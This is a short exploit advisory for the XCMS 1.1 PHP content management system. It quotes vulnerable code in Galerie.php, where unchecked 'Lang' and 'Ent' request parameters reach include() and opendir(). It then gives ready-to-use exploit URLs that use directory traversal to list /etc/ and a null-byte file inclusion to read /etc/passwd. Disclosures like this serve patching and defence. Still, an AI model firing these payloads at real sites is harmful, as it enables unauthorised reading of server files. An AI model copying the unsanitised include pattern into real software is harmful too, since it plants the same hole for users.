XCMS 1.1 (Galerie.php) Local File Inclusion Vulnerabilities
===========================================================


#Author::   BlackNDoor 
#Homepage:: www.learntohell.net
#
#Script::   XCMS : CMS
#Version::  1.1
#Type::     Remote Directory Listing & Local File Include
#
#Source::   http://groupeclan.free.fr/XCMS.zip

#Bug::
   -> Files:

      /Module/Galerie.php.php

   -> vulncode:

      if(!isset($_GET[&#039;Lang&#039;])) { $Lang="fr"; } else { $Lang=$_GET[&#039;Lang&#039;]; }
      if(!isset($_GET[&#039;Ent&#039;])) { $Ent=&#039;false&#039;; } else { $Ent=$_GET[&#039;Ent&#039;]; }
      include(&#039;Lang/&#039; . $Lang . &#039;.lang&#039;);  <--- Local File Include
      if($Ent)
      {
	$Nb = -1;
	$Dossier = opendir("../Images/$Lang/$Ent");  <--- Directory Listing


#Exploit::

   http://www.site.com/[path to XCMS]/Module/Galerie.php?Ent=../../../../../../etc/
   http://www.site.com/[path to XCMS]/Module/Galerie.php?Lang=../../../../../../etc/passwd%00



